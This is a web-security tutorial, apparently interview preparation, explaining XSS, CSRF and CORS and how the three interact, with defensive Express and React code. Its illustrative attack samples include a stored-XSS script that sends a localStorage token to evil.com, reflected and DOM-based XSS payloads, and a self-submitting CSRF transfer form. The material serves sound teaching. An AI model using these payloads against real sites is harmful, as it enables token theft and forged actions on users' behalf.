# XSS, CSRF, and CORS

Three abbreviations that get confused constantly, and three different things. XSS (cross-site scripting) is injected code. CSRF (cross-site request forgery) is a forged request. CORS (cross-origin resource sharing) is a browser policy. The last section shows how the three interact.

## XSS — Cross-Site Scripting

XSS is an attack where an attacker injects malicious JavaScript into pages viewed by other users. The victim's browser executes this code in the context of your site.

### Three types of XSS

**Stored XSS (most dangerous)**: malicious code is saved to the database and served to all users.

```typescript
// Scenario: a comment site that doesn't escape input

// Attacker submits a comment:
const maliciousComment = `<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('token'));
</script>`;

// Server saves it as-is and renders it on the page:
// <div class="comment">{maliciousComment}</div>
// → every visitor's browser will execute the fetch to evil.com
```

**Reflected XSS**: malicious code is passed in a URL and reflected back in the response.

```
GET /search?q=<script>alert(document.cookie)</script>
// If the server returns: "Search results: <script>..."
// → the browser executes the script
```

**DOM-based XSS**: the vulnerability lives entirely in client-side JavaScript, in the DOM (document object model) that the page builds. The server is not involved.

```javascript
// VULNERABLE: directly inserting a URL parameter into the DOM
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${name}!`;
// URL: /page?name=<img src=x onerror=alert(1)> → XSS executes
```

### What an XSS attack can do

The injected script runs with everything the page itself has. Five things it does in practice:

1. Steal tokens: `localStorage.getItem('token')` and `document.cookie` when the cookie is not HttpOnly.
2. Keylogger: intercept keystrokes on forms.
3. Form hijacking: send credentials to evil.com.
4. Actions on behalf of the user: create orders, change email or password.
5. Browser takeover via the BeEF (Browser Exploitation Framework) tool: turn the browser into a bot.

### Defending against XSS

```typescript
// 1. Never use innerHTML with user data
// BAD:
element.innerHTML = userInput;

// GOOD: textContent escapes HTML special characters
element.textContent = userInput;

// 2. React: automatic HTML escaping with {expression}
// SAFE:
<div>{userInput}</div>

// DANGEROUS — bypasses React's protection:
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// 3. Server-side (Express + templates): always use server-side escaping
// (EJS: <%= %> escapes, <%- %> does not!)

// 4. Content Security Policy (CSP) — the last line of defense:
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"], // blocks inline scripts and external scripts
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'", 'https://api.myapp.com'],
  },
}));

// 5. HttpOnly cookies: even if XSS fires, JS can't read the cookie
res.cookie('session', token, { httpOnly: true });
```

Content Security Policy (CSP) together with HttpOnly means XSS may still fire, but it won't be able to steal cookies or load external scripts.

## CSRF — Cross-Site Request Forgery

CSRF is an attack where an attacker tricks an authenticated user's browser into sending a request to your server without the user's knowledge.

The whole attack is six steps, and the user never clicks anything.

1. The user is logged into bank.com and has a session cookie.
2. The user opens evil.com.
3. evil.com contains a hidden form that submits itself.

```html
<form action="https://bank.com/api/transfer" method="POST">
  <input type="hidden" name="amount" value="5000">
  <input type="hidden" name="to" value="attacker-account">
</form>
<script>document.forms[0].submit();</script>
```

4. The browser sends the POST to bank.com.
5. The browser **automatically** attaches the cookie for bank.com.
6. bank.com sees a valid session and executes the transfer.

**Why a JWT (JSON Web Token) in the Authorization header protects against CSRF**: cookies for a domain go out automatically, custom headers do not. On a cross-domain request the `Authorization` header is simply not attached. And evil.com can't read the JWT from memory or localStorage, because the same-origin policy blocks it, so it can't set the header itself.

### Defending against CSRF

```typescript
// 1. SameSite Cookie (modern, simple)
res.cookie('session', token, {
  sameSite: 'strict', // Cookie NOT sent on cross-origin requests
  // sameSite: 'lax'  // Not sent on POST, but sent on GET navigation (links)
  httpOnly: true,
  secure: true,
});

// 2. CSRF Token (classic protection for legacy browsers)
// Server generates a random token on page load
// and embeds it in HTML (hidden input or meta tag)
// Client must send it in the X-CSRF-Token header
// Server validates that the token matches

import csrf from 'csurf';
app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// 3. Double Submit Cookie
// Server sets CSRF_TOKEN in a non-HttpOnly cookie
// JS reads the cookie and adds it to X-CSRF-Token header
// A cross-origin form attacker can't read the cookie (same-origin)
// → can't set the correct header

// 4. Origin/Referer header validation (additional measure)
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    const origin = req.headers.origin;
    if (origin && !ALLOWED_ORIGINS.includes(origin)) {
      return res.status(403).json({ error: 'Invalid origin' });
    }
  }
  next();
});
```

## CORS — Cross-Origin Resource Sharing

**Important**: CORS is **not** a server security mechanism. It's a browser policy that controls access to resources from a different origin.

An origin is the triple of scheme, host and port. Change any one of the three and you have a different origin.

| One origin | The other origin | What differs |
|---|---|---|
| `http://localhost:3000` | `http://localhost:4000` | port |
| `http://example.com` | `https://example.com` | scheme |
| `http://api.example.com` | `http://example.com` | subdomain |

Same-origin policy: by default browsers block cross-origin requests made with `fetch` or `XMLHttpRequest`, unless the server has explicitly permitted them via CORS headers.

CORS protects the browser, **not** the server. Requests from curl, from Postman or from another backend never see CORS at all. Only a user's browser enforces it.

### Preflight Request — when and why

Before the main request the browser may ask permission with an OPTIONS request, called a preflight. It does so if any of these is true:

- The method is DELETE, PUT or PATCH, and not one of the "simple" methods GET, POST and HEAD.
- The header is `Authorization`, or `Content-Type: application/json`, and not one of the "simple" headers.
- There is any custom header at all, for example `X-Request-ID`.

```http
OPTIONS /api/users HTTP/1.1
Origin: https://frontend.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization
```

A server that allows the call answers like this. The last line caches the preflight for 24 hours, so the browser doesn't repeat it.

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://frontend.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 86400
```

```typescript
// Express CORS configuration
import cors from 'cors';

const corsOptions: cors.CorsOptions = {
  origin: (origin, callback) => {
    const allowedOrigins = [
      'https://myapp.com',
      'https://staging.myapp.com',
      ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : []),
    ];
    // origin === undefined: request without Origin (curl, server-to-server)
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error(`CORS: origin ${origin} not allowed`));
    }
  },
  credentials: true,        // allow cookies on cross-origin requests
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400,
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions)); // preflight for all routes
```

**Common mistake**: `Access-Control-Allow-Origin: *` + `credentials: true` — this is an invalid combination. The browser won't send cookies when Allow-Origin is a wildcard. With credentials, a specific origin is required.

## How XSS, CSRF, and CORS interact

**XSS and CSRF interact.** With XSS the attacker makes requests **from your own origin**, and that removes most of the usual defenses:

- Same-origin policy and CORS don't help, because the request really does come from your domain.
- A CSRF token doesn't help either, because the injected script can read it from the DOM.
- What is left: an HttpOnly cookie, which JS can't read, and CSP, which limits what an injected script can do.

**CORS does not protect against CSRF.** Browsers check CORS for `fetch` and `XMLHttpRequest`, but a simple HTML form submission is **not** checked by CORS. So a CSRF token or a SameSite cookie is still needed.

**A JWT in a header protects against CSRF, but not against XSS.**

- Against CSRF it works: the browser doesn't send the `Authorization` header automatically.
- Against XSS it fails: a JWT in localStorage is exactly what an injected script steals.
- The solution that covers both: a JWT in an HttpOnly cookie with `SameSite=strict`.

## Common interview mistakes

- **"CORS protects the server"** — CORS is a browser policy, not a server mechanism. curl/Postman/another backend bypasses CORS entirely. The server is protected by authentication and authorization.

- **"XSS and CSRF are the same thing"** — they're different attacks. XSS: browser executes foreign code on your site. CSRF: browser sends a legitimate request to your site from another site. XSS is more powerful — when XSS fires, CSRF tokens don't help.

- **"`Access-Control-Allow-Origin: *` is safe for APIs with authorization"** — with a wildcard origin, the browser won't send cookies (credentials must be false). If the API requires cookie-based auth, a wildcard will break sessions.

- **"HttpOnly fully protects against XSS"** — HttpOnly only prevents cookies from being read by JS. XSS can still make requests on behalf of the user (reads CSRF tokens from the DOM, submits forms, makes fetch calls from your origin).

- **"SameSite=Lax fully protects against CSRF"** — Lax allows GET requests via navigation (links). If you have state-changing GET endpoints, Lax isn't enough. For full protection: `strict` or a CSRF token.
